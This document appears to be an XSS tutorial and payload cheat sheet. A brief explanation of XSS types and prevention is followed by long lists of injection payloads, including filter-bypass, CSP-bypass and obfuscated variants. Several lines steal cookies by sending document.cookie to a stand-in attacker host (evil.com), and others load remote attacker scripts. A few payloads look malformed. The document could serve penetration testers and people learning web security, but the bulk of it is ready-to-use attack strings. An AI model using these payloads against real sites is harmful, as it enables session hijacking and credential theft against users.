## **🔍 What is XSS (Cross-Site Scripting)?**  

**Cross-Site Scripting (XSS)** is a web security vulnerability that allows attackers to inject **malicious scripts** into web pages viewed by users. It is one of the **most common** and **dangerous** vulnerabilities in web applications, as it can be used to steal sensitive data, hijack user sessions, and even deface websites.  

---

## **🛠️ How Does XSS Work?**  

1. **Injection** – The attacker finds a vulnerable input field (e.g., a search box, comment section, or URL parameter) and injects a **malicious script**.  
2. **Execution** – The victim visits the compromised page, and their browser **executes the attacker's script** as if it were part of the legitimate website.  
3. **Impact** – The script can steal **cookies, session tokens, or credentials**, manipulate page content, redirect users, or perform **phishing attacks**.  

---

## **🧨 Types of XSS Attacks**  

### **1️⃣ Stored XSS (Persistent XSS)**
- The **malicious script is permanently stored** on the website (e.g., in a database, comment, or forum post).  
- Whenever a user loads the infected page, the script runs automatically.  
- **Example:**
  ```html
  <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
  ```
- **Impact:** Can affect multiple users without requiring them to interact with a malicious link.  

---

### **2️⃣ Reflected XSS (Non-Persistent XSS)**
- The **malicious script is not stored** on the website but is sent via a **URL, form, or request parameter**.  
- The victim **clicks on a malicious link**, and the script executes in their browser.  
- **Example:**
  ```
  https://victim.com/search?q=<script>alert('XSS')</script>
  ```
- **Impact:** Requires social engineering (phishing) but can be dangerous for stealing cookies and credentials.  

---

### **3️⃣ DOM-Based XSS**
- The attack **modifies the Document Object Model (DOM)** of the webpage using JavaScript.  
- The script is executed **directly in the victim's browser** without sending a request to the server.  
- **Example:**
  ```javascript
  var url = new URLSearchParams(window.location.search);
  document.write(url.get('input'));  // Vulnerable code
  ```
  If a user visits:
  ```
  https://victim.com/page?input=<script>alert(1)</script>
  ```
  The script runs immediately!  
- **Impact:** Harder to detect because no request is sent to the server.  

---

## **⚠️ What Can an Attacker Do with XSS?**
🔴 **Steal cookies and session tokens** → Hijack accounts.  
🟠 **Deface web pages** → Modify content and inject fake news.  
🟡 **Phishing attacks** → Trick users into entering credentials.  
🟢 **Keylogging** → Capture user keystrokes.  
🔵 **Spread malware** → Inject malicious scripts.  

---

## **🛡️ How to Prevent XSS?**
✅ **Input Validation** – Sanitize and validate all user inputs.  
✅ **Escape User Data** – Convert special characters (like `<` and `>`) to HTML entities (`&lt;`, `&gt;`).  
✅ **Use Content Security Policy (CSP)** – Restrict the execution of inline scripts.  
✅ **Use HTTPOnly Cookies** – Prevent JavaScript from accessing session cookies.  
✅ **Sanitize Output** – Encode or filter data before displaying it on the webpage.  

---

### **🛠️ Basic XSS Payloads**
```html
<script>alert(1)</script>
"><script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
"><svg/onload=alert(1)>
<marquee loop=1 width=0 onfinish=alert(1)>
<details open ontoggle=alert(1)>
<iframe src="javascript:alert(1)"></iframe>
```

---

### **🖼️ SVG-Based XSS**
```html
<svg><script>alert('XSS')</script></svg>
"><svg/onload=alert('XSS')>
<svg><animate onbegin=alert(1) />
"><svg/onload=setTimeout`alert\x281\x29`>
<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
```

---

### **🔄 Filter Bypass Techniques**
```html
<scr<script>ipt>alert(1)</scr<script>ipt>
"><img src=x onerror='this.onerror=null;alert(1)'>
"><sCrIpT>alert(1)</sCrIpT>
"><a href="JaVaScRiPt:alert(1)">Click me</a>
"><svg/onload=setTimeout`alert\x281\x29`>
```

---

### **📜 JavaScript Event Handlers**
```html
<input autofocus onfocus=alert(1)>
"><input onmouseover="alert(1)">
"><button onpointerover=alert(1)>Click me</button>
"><a href=javascript:alert(1)>Click me</a>
```

---

### **🚀 Blind XSS Payloads (Data Exfiltration)**
```html
<script>new Image().src='https://evil.com/steal?cookie='+document.cookie;</script>
"><script>fetch('https://evil.com/steal?data='+btoa(document.cookie))</script>
"><script>navigator.sendBeacon('https://evil.com/log', document.cookie)</script>
"><script>location='//evil.com/log?'+document.cookie</script>
```

---

### **🕵️‍♂️ CSP Bypass Techniques**
```html
<script src=//evil.com/xss.js></script>
<iframe srcdoc="<script>alert(1)</script>"></iframe>
<object data="javascript:alert(1)"></object>
<svg/onload=fetch('//evil.com/xss')>
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
```

---

### **🧨 Advanced Obfuscation Payloads**
```html
<svg/onload=eval('\u0061\u006c\u0065\u0072\u0074(1)')>
<svg/onloscript>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
"><script>setTimeout('alert(1)',1000)</script>
"><script>onerror=alert;throw 1</script>
"><script>eval(atob('YWxlcnQoMSk='))</script>
"><svg/onload="this.src='javascript:alert(1)'">
```

---

### **📡 Exploiting JSON & APIs**
```json
{"username":"<script>alert(1)</script>"}
{"callback":"<script>alert(document.domain)</script>"}
{"data":"<svg/onload=alert('XSS')>"}
```

---

### **⚡ Breaking Out of Attributes**
```html
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
"><a href="javascript:alert(1)">Click here</a>
" onmouseover="alert(1)" 
```

---

### **🛑 JavaScript URI Exploits**
```html
<a href="javascript:alert(1)">Click me</a>
<iframe src="javascript:alert(1)"></iframe>
<svg><a xlink:href="javascript:alert(1)">Click</a></svg>
```

---

### **📡 XSS via JavaScript Variables**
```javascript
var x = "><script>alert(1)</script>"; document.body.innerHTML = x;
document.write('<script>alert(1)</script>');
location.href="javascript:alert(document.domain)";
setTimeout('alert(1)', 1000);
fetch('https://evil.com?cookie='+document.cookie);
```

---

### **💀 Mutation XSS (mXSS)**
```html
<svg><p title="</p><script>alert(1)</script>">XSS</p></svg>
"><form><button formaction=javascript:alert(1)>Click</button>
"><svg><use href="#"></use><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
```

---

### **🔧 jQuery-Based XSS**
```javascript
$(document).ready(function(){ $('body').append('<script>alert(1)</script>'); });
$('#test').html('<img src=x onerror=alert(1)>');
$.getScript('//evil.com/xss.js');
```

---

### **📜 JavaScript Prototype Pollution XSS**
```javascript
Object.prototype.toString = function() { alert('XSS') };
```

---

### **📌 XSS via CSS**
```css
body{background:url("javascript:alert(1)")}
<style>@import'javascript:alert(1)';</style>
```

---

### **📦 WebSockets & Service Worker XSS**
```javascript
ws = new WebSocket('wss://evil.com'); ws.onopen = function() { alert(1); };
navigator.serviceWorker.register("data:application/javascript,alert(1)");
```

---

### **🔄 XSS via Content Injection**
```html
"> <h1>Hacked</h1> <script>alert(1)</script>
"> <style>body{background:red}</style>
"> <marquee onstart=alert(1)>
```

---

### **🚀 XSS in Email Clients**
```html
<iframe src="javascript:alert(document.cookie)"></iframe>
<img src="cid:x" onerror="alert(1)">
```

---
 
1️⃣ XSS Automation Tools

🔹 XSStrike – AI-based XSS scanner (https://github.com/s0md3v/XSStrike) 

🔹 DalFox – Fast XSS scanner with parameter mining (https://github.com/hahwul/dalfox)

🔹 PwnXSS – Vulnerability (XSS) scanner exploit   (https://github.com/pwn0sec/PwnXSS)

🔹 XSSHunter – Finds blind XSS vulnerabilities (https://xsshunter.com/#/)

🔹 Burp Suite – Used for intercepting & modifying requests


